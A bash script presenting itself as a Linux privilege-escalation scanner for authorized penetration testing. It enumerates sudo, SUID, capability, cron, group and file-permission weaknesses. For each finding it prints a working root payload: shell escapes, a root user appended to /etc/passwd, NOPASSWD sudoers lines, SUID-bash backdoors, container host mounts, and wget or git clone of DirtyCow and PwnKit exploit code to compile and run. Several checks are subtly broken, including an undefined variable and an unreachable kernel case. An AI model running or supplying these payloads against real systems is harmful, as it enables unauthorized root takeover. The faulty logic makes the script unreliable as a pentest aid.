#!/bin/bash
# =============================================================================
#  LPE-SCANNER (LinPEAS-Lite)
#  Advanced Linux Privilege Escalation Scanner
#  Author  : Your Name
#  Version : 1.0
#  Usage   : ./lpe-scanner.sh [-o output.txt]
#  WARNING : For authorized penetration testing ONLY.
# =============================================================================

# --------------------------- COLOR PALETTE -----------------------------------
RED='\033[0;31m'
LRED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
BOLD='\033[1m'
DIM='\033[2m'
RESET='\033[0m'

# --------------------------- OUTPUT HANDLING ---------------------------------
OUTPUT_FILE=""
if [[ "$1" == "-o" && -n "$2" ]]; then
    OUTPUT_FILE="$2"
    exec > >(tee -a "$OUTPUT_FILE") 2>&1
fi

# --------------------------- HELPERS -----------------------------------------
VULN_COUNT=0
INFO_COUNT=0

banner() {
    clear
    echo -e "${MAGENTA}${BOLD}"
    cat << "EOF"
    ██╗     ██████╗ ███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗
    ██║     ██╔══██╗██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║
    ██║     ██████╔╝█████╗      ███████╗██║     ███████║██╔██╗ ██║
    ██║     ██╔═══╝ ██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║
    ███████╗██║     ███████╗    ███████║╚██████╗██║  ██║██║ ╚████║
    ╚══════╝╚═╝     ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
EOF
    echo -e "${RESET}"
    echo -e "${CYAN}${BOLD}  Advanced Linux Privilege Escalation Scanner  v1.0${RESET}"
    echo -e "${DIM}  For AUTHORIZED penetration testing only.${RESET}"
    echo -e "${MAGENTA}  ─────────────────────────────────────────────────────${RESET}"
    echo ""
}

section() {
    echo ""
    echo -e "${BLUE}${BOLD}╔══════════════════════════════════════════════════════════╗${RESET}"
    printf "${BLUE}${BOLD}║  %-56s║${RESET}\n" "$1"
    echo -e "${BLUE}${BOLD}╚══════════════════════════════════════════════════════════╝${RESET}"
}

vuln() {
    # $1 = title, $2 = payload
    VULN_COUNT=$((VULN_COUNT + 1))
    echo -e "  ${LRED}[!] VULN:${RESET} ${WHITE}$1${RESET}"
    if [[ -n "$2" ]]; then
        echo -e "  ${GREEN}    ├─ Payload:${RESET} ${YELLOW}$2${RESET}"
    fi
}

info() {
    INFO_COUNT=$((INFO_COUNT + 1))
    echo -e "  ${CYAN}[i]${RESET} $1"
}

safe() {
    echo -e "  ${GREEN}[✓]${RESET} $1"
}

warn() {
    echo -e "  ${YELLOW}[?]${RESET} $1"
}

# --------------------------- BANNER & INFO -----------------------------------
banner

section "INFORMATION GATHERING"
echo -e "  ${WHITE}User        :${RESET} $(id)"
echo -e "  ${WHITE}Hostname    :${RESET} $(hostname)"
echo -e "  ${WHITE}Kernel      :${RESET} $(uname -r)"
echo -e "  ${WHITE}OS          :${RESET} $(grep -E '^(PRETTY_NAME|VERSION)=' /etc/os-release 2>/dev/null | head -1 | cut -d= -f2 | tr -d '\"')"
echo -e "  ${WHITE}Arch        :${RESET} $(uname -m)"
echo -e "  ${WHITE}Current Dir :${RESET} $(pwd)"
echo -e "  ${WHITE}Home        :${RESET} $HOME"
echo -e "  ${WHITE}Shell       :${RESET} $SHELL"
echo -e "  ${WHITE}Groups      :${RESET} $(groups 2>/dev/null)"

# --------------------------- 1. SUDO MISCONFIGURATIONS -----------------------
check_sudo() {
    section "1. SUDO MISCONFIGURATIONS"

    if ! command -v sudo &>/dev/null; then
        safe "sudo not installed"
        return
    fi

    local SUDO_OUT
    SUDO_OUT=$(sudo -n -l 2>/dev/null)
    if [[ $? -ne 0 && -z "$SUDO_OUT" ]]; then
        warn "Cannot list sudo rules (may need password or no sudo rights)"
        return
    fi

    echo "$SUDO_OUT" | while IFS= read -r line; do
        [[ "$line" =~ \(ALL|root\) ]] || continue

        # NOPASSWD check
        if [[ "$line" == *"NOPASSWD"* ]]; then
            vuln "NOPASSWD sudo entry: $line" "sudo $(echo "$line" | awk '{print $NF}')"
        fi

        # GTFOBins lookup
        local bin
        bin=$(echo "$line" | grep -oE '/[a-zA-Z0-9_./-]+' | tail -1 | xargs basename 2>/dev/null)
        [[ -z "$bin" ]] && continue

        case "$bin" in
            vim|vi|nano|less|more|man|ftp|gdb|python|python3|perl|ruby|lua|node)
                vuln "sudo $bin → spawn shell" "sudo $bin -c ':!/bin/sh'  # or for python: sudo $bin -c 'import os;os.system(\"/bin/sh\")'";;
            find)
                vuln "sudo find → shell" "sudo find . -exec /bin/sh -p \\; -quit";;
            bash|sh)
                vuln "sudo bash → direct root shell" "sudo $bin";;
            tar)
                vuln "sudo tar → shell" "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
            nmap)
                vuln "sudo nmap → shell (interactive mode)" "sudo nmap --interactive  # then !sh";;
            awk|gawk|mawk)
                vuln "sudo awk → shell" "sudo awk 'BEGIN {system(\"/bin/sh\")}'";;
            env)
                vuln "sudo env → shell" "sudo env /bin/sh";;
            cp)
                vuln "sudo cp → overwrite /etc/passwd" "sudo cp /tmp/pwned /etc/passwd";;
            tee)
                vuln "sudo tee → append root user" "echo 'root2::0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd";;
            *)
                info "sudo allowed: $bin (check GTFOBins manually)";;
        esac
    done
}

# --------------------------- 2. SUID BINARIES --------------------------------
check_suid() {
    section "2. SUID BINARIES"

    local KNOWN_GTFOBINS=(
        "bash" "sh" "dash" "zsh" "ksh"
        "find" "vim" "vi" "nano" "less" "more" "man" "awk" "gawk"
        "cp" "mv" "cat" "tar" "nmap" "python" "python3" "perl" "ruby"
        "env" "tee" "base64" "xxd" "dd" "sed" "openssl" "gdb"
        "php" "node" "lua" "curl" "wget" "rsync" "strace" "ltrace"
    )

    local suid_bins
    suid_bins=$(find / -perm -4000 -type f 2>/dev/null)

    local found=0
    while IFS= read -r bin; do
        [[ -z "$bin" ]] && continue
        found=$((found + 1))
        local base
        base=$(basename "$bin")

        for known in "${KNOWN_GTFOBINS[@]}"; do
            if [[ "$base" == "$known" ]]; then
                case "$base" in
                    bash|sh|dash|zsh|ksh)
                        vuln "SUID shell: $bin" "$bin -p";;
                    find)
                        vuln "SUID find: $bin" "$bin . -exec /bin/sh -p \\; -quit";;
                    vim|vi|nano)
                        vuln "SUID $base: $bin" "$bin -c ':!/bin/sh'";;
                    less|more|man)
                        vuln "SUID $base: $bin" "$bin  # then !/bin/sh";;
                    awk|gawk)
                        vuln "SUID awk: $bin" "$bin 'BEGIN{system(\"/bin/sh\")}'";;
                    cp)
                        vuln "SUID cp: $bin" "$bin /tmp/rootbash && /tmp/rootbash -p";;
                    tar)
                        vuln "SUID tar: $bin" "$bin -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh";;
                    python|python3|perl|ruby|php|node|lua)
                        vuln "SUID $base: $bin" "$bin -c 'import os;os.setuid(0);os.system(\"/bin/sh\")'  # python";;
                    *)
                        vuln "SUID GTFOBin: $bin" "Check GTFOBins for '$base'";;
                esac
                break
            fi
        done
    done <<< "$suid_bins"

    if [[ $found -eq 0 ]]; then
        safe "No SUID binaries found"
    else
        info "Total SUID binaries: $found (only GTFOBins flagged above)"
    fi
}

# --------------------------- 3. LINUX CAPABILITIES ---------------------------
check_capabilities() {
    section "3. LINUX CAPABILITIES"

    if ! command -v getcap &>/dev/null; then
        safe "getcap not installed"
        return
    fi

    local caps
    caps=$(getcap -r / 2>/dev/null)
    if [[ -z "$caps" ]]; then
        safe "No capabilities set"
        return
    fi

    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        if echo "$line" | grep -qE "cap_setuid|cap_setgid"; then
            local bin
            bin=$(echo "$line" | awk '{print $1}')
            vuln "Dangerous capability: $line" "Use $bin to call setuid(0) and exec /bin/sh"
        elif echo "$line" | grep -q "cap_dac_read_search"; then
            vuln "cap_dac_read_search: $line" "Use $bin to read /etc/shadow"
        else
            info "Capability: $line"
        fi
    done <<< "$caps"
}

# --------------------------- 4. SENSITIVE FILES ------------------------------
check_files() {
    section "4. SENSITIVE FILE PERMISSIONS"

    # /etc/passwd writable
    if [[ -w /etc/passwd ]]; then
        vuln "/etc/passwd is WORLD-WRITABLE" "openssl passwd -1 -salt x pwned | xargs -I{} sh -c 'echo \"pwn:{}:0:0:root:/root:/bin/bash\" >> /etc/passwd && su pwn'"
    else
        safe "/etc/passwd not writable"
    fi

    # /etc/shadow readable
    if [[ -r /etc/shadow ]]; then
        vuln "/etc/shadow is READABLE" "cat /etc/shadow | grep root > /tmp/root.hash && john /tmp/root.hash"
    else
        safe "/etc/shadow not readable"
    fi

    # /etc/sudoers writable
    if [[ -w /etc/sudoers ]]; then
        vuln "/etc/sudoers is WRITABLE" "echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers"
    fi

    # Writable files in /etc (excluding known noise)
    local writable_etc
    writable_etc=$(find /etc -maxdepth 2 -type f -writable 2>/dev/null | grep -vE "/(mtab|ld.so.cache|resolv.conf|hosts)$")
    if [[ -n "$writable_etc" ]]; then
        while IFS= read -r f; do
            vuln "Writable in /etc: $f" "Modify $f with your payload"
        done <<< "$writable_etc"
    fi

    # SSH private keys
    local keys
    keys=$(find /home /root -name "id_rsa" -o -name "id_ed25519" 2>/dev/null)
    if [[ -n "$keys" ]]; then
        while IFS= read -r k; do
            [[ -r "$k" ]] && info "Readable SSH key: $k"
        done <<< "$keys"
    fi

    # Writable /etc/passwd.bak style files
    find /etc -maxdepth 1 -name "*.bak" -writable 2>/dev/null | while read -r f; do
        vuln "Writable backup: $f" "echo 'pwn::0:0:root:/root:/bin/bash' >> $f"
    done
}

# --------------------------- 5. CRON JOBS ------------------------------------
check_cron() {
    section "5. CRON JOBS"

    # Writable cron scripts
    local writable_cron
    writable_cron=$(find /etc/cron* /var/spool/cron /etc/crontab -writable 2>/dev/null)
    if [[ -n "$writable_cron" ]]; then
        while IFS= read -r c; do
            vuln "Writable cron: $c" "echo '* * * * * root cp /bin/bash /tmp/rb && chmod +s /tmp/rb' >> $c"
        done <<< "$writable_cron"
    else
        safe "No writable cron files"
    fi

    # Cron entries with writable scripts (PATH hijack / script overwrite)
    if [[ -r /etc/crontab ]]; then
        grep -vE "^#|^$" /etc/crontab 2>/dev/null | while read -r line; do
            local script
            script=$(echo "$line" | grep -oE '/[^ ]+\.(sh|py|pl)' | head -1)
            if [[ -n "$script" && -w "$script" ]]; then
                vuln "Cron runs writable script: $script" "echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > $script"
            fi
        done
    fi

    # Wildcard injection in cron (tar/rsync)
    if grep -qE "tar|rsync" /etc/crontab 2>/dev/null; then
        vuln "Possible wildcard injection in cron" "echo 'echo \"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\" > /tmp/shell.sh' > /tmp/--checkpoint-action=exec=sh\ /tmp/shell.sh"
    fi
}

# --------------------------- 6. KERNEL EXPLOITS ------------------------------
check_kernel() {
    section "6. KERNEL VERSION / KNOWN EXPLOITS"

    local kernel
    kernel=$(uname -r)
    info "Kernel: $kernel"

    case "$kernel" in
        2.6.*|3.*)
            vuln "Old kernel $kernel" "Check exploits: searchsploit linux kernel $kernel";;
        4.4.0-*)
            vuln "Kernel $kernel → CVE-2017-16995 (Ubuntu 16.04)" "Download exploit-db #45010, compile & run";;
        4.4.0-21*)
            vuln "Kernel $kernel → CVE-2016-5195 (DirtyCow)" "wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtycow.c && gcc -pthread dirtycow.c -o dirty -lcrypt";;
        4.8.*|4.10.*|4.13.*)
            vuln "Kernel $kernel → CVE-2017-1000112" "searchsploit -m 45147";;
        5.8.*|5.9.*|5.10.*|5.11.*)
            vuln "Kernel $kernel → check PwnKit/Polkit (CVE-2021-4034)" "wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c && make && ./cve-2021-4034";;
        *)
            info "No obvious kernel exploit match — run searchsploit linux kernel $kernel";;
    esac

    # Check for pkexec (PwnKit)
    if [[ -x /usr/bin/pkexec ]]; then
        local pk_version
        pk_version=$(/usr/bin/pkexec --version 2>/dev/null | head -1)
        vuln "pkexec present ($pk_version) — likely CVE-2021-4034 (PwnKit)" "git clone https://github.com/berdav/CVE-2021-4034.git && cd CVE-2021-4034 && make && ./cve-2021-4034"
    fi
}

# --------------------------- 7. SERVICES / DOCKER ----------------------------
check_services() {
    section "7. SERVICES & CONTAINERS"

    # Docker group
    if groups 2>/dev/null | grep -qw docker; then
        vuln "User is in 'docker' group" "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    fi

    # LXD group
    if groups 2>/dev/null | grep -qw lxd; then
        vuln "User is in 'lxd' group" "lxc image import ./alpine.tar.gz --alias pwn && lxc init pwn r -c security.privileged=true && lxc config device add r host disk source=/ path=/mnt/root recursive=true && lxc start r && lxc exec r /bin/sh"
    fi

    # Disk group
    if groups 2>/dev/null | grep -qw disk; then
        vuln "User is in 'disk' group" "debugfs /dev/sda1 -R 'cat /etc/shadow'"
    fi

    # Writable /etc/systemd/system
    if [[ -w /etc/systemd/system ]]; then
        vuln "/etc/systemd/system is writable" "Create .service file that runs /bin/bash with root, then systemctl enable+start"
    fi
}

# --------------------------- 8. PATH HIJACK ----------------------------------
check_path() {
    section "8. PATH / ENV HIJACK"

    echo -e "  ${WHITE}PATH:${RESET} $PATH"

    # Check if any directory in PATH is writable
    IFS=':' read -ra PATHS <<< "$PATH"
    for p in "${PATHS[@]}"; do
        if [[ -d "$p" && -w "$p" && "$p" != "." ]]; then
            vuln "Writable dir in PATH: $p" "Place a malicious 'ls'/'id' binary here — it will run as root"
        fi
    done

    # . (current dir) in PATH
    if echo "$PATH" | grep -qE "(^|:)\.(:|$)"; then
        vuln "'.' (current dir) in PATH" "Place malicious binary in current dir"
    fi

    # LD_PRELOAD writable
    if [[ -n "$LD_PRELOAD" ]]; then
        info "LD_PRELOAD=$LD_PRELOAD"
    fi
}

# --------------------------- 9. WRITABLE SENSITIVE BINARIES ------------------
check_writable_bins() {
    section "9. WRITABLE SYSTEM BINARIES"

    local WRITABLE_BINS
    WRITABLE_BINS=$(find /usr/bin /usr/sbin /bin /sbin -type f -writable 2>/dev/null)
    if [[ -n "$WRITABLE_BINS" ]]; then
        while IFS= read -r b; do
            vuln "Writable binary: $b" "echo '#!/bin/bash' > $b && echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> $b"
        done <<< "$WRITABLE_BINS"
    else
        safe "No writable system binaries"
    fi
}

# --------------------------- 10. PASSWORDS IN FILES --------------------------
check_passwords() {
    section "10. PASSWORD HUNT (quick)"

    local HITS
    HITS=$(grep -rIlE "password|passwd|secret|api[_-]?key" \
        /var/www /home /etc /opt /srv 2>/dev/null | head -20)
    if [[ -n "$HITS" ]]; then
        while IFS= read -r f; do
            info "Possible creds in: $f"
        done <<< "$HITS"
        echo -e "  ${DIM}Hint: grep -RiE 'password|passwd' $f${RESET}"
    else
        safe "No obvious credential files found"
    fi
}

# --------------------------- REPORT ------------------------------------------
print_summary() {
    echo ""
    echo -e "${MAGENTA}${BOLD}╔══════════════════════════════════════════════════════════╗${RESET}"
    echo -e "${MAGENTA}${BOLD}║                    SCAN SUMMARY                          ║${RESET}"
    echo -e "${MAGENTA}${BOLD}╚══════════════════════════════════════════════════════════╝${RESET}"
    echo -e "  ${WHITE}Vulnerabilities found :${RESET} ${LRED}${BOLD}$VULN_COUNT${RESET}"
    echo -e "  ${WHITE}Informational items   :${RESET} ${CYAN}$INFO_COUNT${RESET}"
    if [[ -n "$OUTPUT_FILE" ]]; then
        echo -e "  ${WHITE}Report saved to       :${RESET} $OUTPUT_FILE"
    fi
    echo ""
    echo -e "  ${YELLOW}Review GTFOBins: https://gtfobins.github.io/${RESET}"
    echo -e "  ${YELLOW}Review LOLBAS  : https://lolbas-project.github.io/${RESET}"
    echo ""
}

# --------------------------- MAIN --------------------------------------------
main() {
    check_sudo
    check_suid
    check_capabilities
    check_files
    check_cron
    check_kernel
    check_services
    check_path
    check_writable_bins
    check_passwords
    print_summary
}

main
